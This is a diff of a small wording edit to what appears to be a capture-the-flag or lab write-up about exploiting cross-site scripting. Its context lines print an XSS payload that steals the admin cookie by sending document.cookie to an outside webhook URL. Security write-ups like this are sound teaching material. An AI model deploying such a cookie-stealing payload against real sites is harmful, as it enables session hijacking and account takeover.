@@ -57,7 +57,7 @@ And then i tried to use normal XSS payload
 
 ![testing](images/testing.png)
 
-And we got an alert, so I tried to create another payload to steal the admin cookie. Here is the payload that I used to steal the cookie
+And we got an alert, so I tried to create another payload to steal the admin cookie. Here is the payload I used to steal the cookie
 
 ```
 <img src=x onerror=\"var i=new Image(); i.src='https://webhook.site/47c2cdc9-1233-4ac8-8e8b-55efe06aeb2c/?cookie='+btoa(document.cookie)\">"
